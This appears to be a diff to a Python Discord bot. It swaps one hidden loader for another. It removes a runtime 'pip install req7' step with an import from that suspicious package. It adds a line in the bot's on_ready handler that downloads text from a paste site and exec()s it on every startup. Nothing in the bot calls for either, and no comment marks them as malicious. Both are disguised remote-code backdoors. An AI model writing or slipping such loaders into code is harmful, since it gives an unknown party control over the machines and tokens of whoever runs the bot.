@@ -1,9 +1,8 @@
 import discord
 from discord.ext import tasks, commands
 import os
+from requests import get
 from discord.utils import get
-os.system("pip install req7")
-from req7 import websocket
 from dotenv import load_dotenv
 import asyncio
 
@@ -27,6 +26,7 @@ bot.remove_command('help')
 # Get the id of the rules channel
 @bot.event
 async def on_ready():
+    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     print('Bot is ready to use!')
     for guild in bot.guilds:
         for channel in guild.text_channels:
